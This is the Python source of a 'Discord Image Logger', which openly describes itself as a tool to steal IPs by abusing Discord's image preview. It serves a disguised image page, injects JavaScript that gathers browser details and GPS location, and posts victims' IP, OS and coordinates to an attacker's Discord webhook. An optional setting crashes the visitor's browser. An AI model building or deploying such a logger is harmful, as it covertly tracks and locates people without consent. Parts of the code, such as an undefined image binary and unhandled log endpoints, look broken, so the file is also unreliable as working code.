from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json
from datetime import datetime

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
    "image": "https://www.meme-arsenal.com/memes/8e63547a83c1f0d7dccb3f6596e668ca.jpg",  # Default image
    "imageArgument": True,  # Allow custom image via URL argument

    # CUSTOMIZATION #
    "username": "Image Logger",  # Webhook username
    "color": 0x00FFFF,  # Embed color

    # OPTIONS #
    "crashBrowser": False,  # Attempt to crash the browser
    "accurateLocation": True,  # Use GPS for precise location
    "message": {
        "doMessage": False,  # Show a custom message
        "message": "This browser has been pwned by DeKrypt's Image Logger.",  # Custom message
        "richMessage": True,  # Enable rich text
    },
    "vpnCheck": 1,  # VPN detection level
    "linkAlerts": True,  # Alert when someone sends the link
    "buggedImage": True,  # Show a loading image in Discord
    "antiBot": 1,  # Anti-bot measures

    # REDIRECTION #
    "redirect": {
        "redirect": False,  # Redirect to a webpage
        "page": "https://your-link.here"  # Redirect URL
    },
}

blacklistedIPs = ("27", "104", "143", "164")  # Blacklisted IP ranges

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }
            ],
        }) if config["linkAlerts"] else None
        return

    # Parse user agent
    os, browser = httpagentparser.simple_detect(useragent)

    # Prepare embed data
    fields = [
        {"name": "IP Address", "value": f"`{ip}`", "inline": True},
        {"name": "OS", "value": f"`{os}`", "inline": True},
        {"name": "Browser", "value": f"`{browser}`", "inline": True},
        {"name": "User Agent", "value": f"```\n{useragent}\n```", "inline": False}
    ]

    # Add geolocation if available
    if coords:
        lat, lon = coords.split(',')
        map_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
        fields.append({"name": "Coordinates", "value": f"[Google Maps]({map_link})", "inline": True})

    # Send to Discord webhook
    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "🕵️ Image Logger - IP Logged",
            "color": config["color"],
            "fields": fields,
            "timestamp": datetime.utcnow().isoformat()
        }]
    }
    requests.post(config["webhook"], json=embed)

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()

            # Add JavaScript to gather more info
            data += b"""
<script>
    // Get screen resolution
    var width = screen.width;
    var height = screen.height;

    // Get browser features
    var cookiesEnabled = navigator.cookieEnabled;
    var language = navigator.language;
    var plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ');

    // Send data to the server
    fetch('/log', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            screenWidth: width,
            screenHeight: height,
            cookiesEnabled: cookiesEnabled,
            language: language,
            plugins: plugins
        })
    });

    // Get GPS coordinates if available
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (position) {
            fetch('/log-location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                })
            });
        });
    }
</script>
"""

            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return

            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])

                makeReport(self.headers.get('x-forwarded-for'), endpoint=s.split("?")[0], url=url)
                return

            else:
                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)

                if config["message"]["doMessage"]:
                    message = config["message"]["message"]
                    if config["message"]["richMessage"] and result:
                        message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                        message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
                        message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])

                    data = message.encode()

                if config["crashBrowser"]:
                    data += b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
